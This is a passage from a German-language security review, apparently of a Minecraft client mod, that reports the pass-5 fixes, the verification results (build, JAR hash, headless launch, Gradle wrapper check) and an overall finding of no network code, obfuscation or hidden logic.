- Unprofessioneller Kommentar in `Dqrkis.java` (persönliche Beleidigung des Original-Autors)
  durch neutralen Hinweis ersetzt — reiner Quell-Kommentar, **keine** Bytecode-Änderung.
- `scripts/capture-client-load.sh`: optionaler `CAPTURE_CLICKGUI=1`-Modus für GUI-Nachweise.
- `docs/screenshots/` (Titelbildschirm + ClickGUI aus dem geprüften Build), überarbeitetes
  `README.md`, neue `SECURITY.md` (Reporting-Weg via GitHub Security Advisories).

### 12.5 Verifikation nach Pass 5

| Prüfung | Ergebnis |
|---|---|
| `./gradlew build` (JDK 21) | **BUILD SUCCESSFUL**, 0 Fehler, 0 Warnungen |
| JAR-Hash nach dem Kommentar-Fix | **unverändert** `7501719d056c1d8134212312fce28b6bc550299374e29dbab416c4a69599d430` (Kommentar erzeugt keinen Bytecode) |
| Headless-Launch (Xvfb) + F2-Screenshots | Client geladen, Titelbildschirm **und** ClickGUI gerendert, 0 Mixin-Fehler, 0 Crash-Reports |
| Wrapper | `gradle-wrapper.jar` == kanonischer 9.2.1-Wrapper (`423cb469…`) |

### 12.6 Gesamtbewertung Pass 5

Der vollständige Re-Review bestätigt das Ergebnis der Pässe 1–4: **kein Netzwerk-Code, keine
Code-Ausführung, keine Verschleierung, keine versteckte Logik** im gesamten Quellbaum. Der einzige
neue Befund (veralteter Wrapper) wurde behoben; zwei Fehlalarme (Cookie-Parameter, GUI-Clipboard)
sind dokumentiert. Die Offline-Garantie (Abschnitt 8) gilt unverändert.
